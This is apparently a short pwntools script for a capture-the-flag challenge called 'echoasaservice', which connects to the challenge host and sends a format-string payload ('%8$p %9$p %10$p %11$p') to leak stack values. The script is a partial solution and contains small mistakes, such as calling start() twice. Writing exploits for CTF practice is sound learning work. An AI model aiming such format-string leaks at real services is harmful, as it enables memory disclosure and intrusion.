from pwn import *
  
BINARY = './echoasaservice'
HOST = 'challenges.tamuctf.com'
PORT = 4251

elf = ELF(BINARY)
context.terminal = ['tmux', 'split-window']

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    if not args.REMOTE and args.GDB:
        gdb.attach(process(BINARY))
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)



p = start()

p = start()
if args.GDB:
    gdb.attach(p, 'b gets')

print(p.recvuntil('(EaaS)'))

exploit = '%8$p %9$p %10$p %11$p'

p.sendline(exploit)
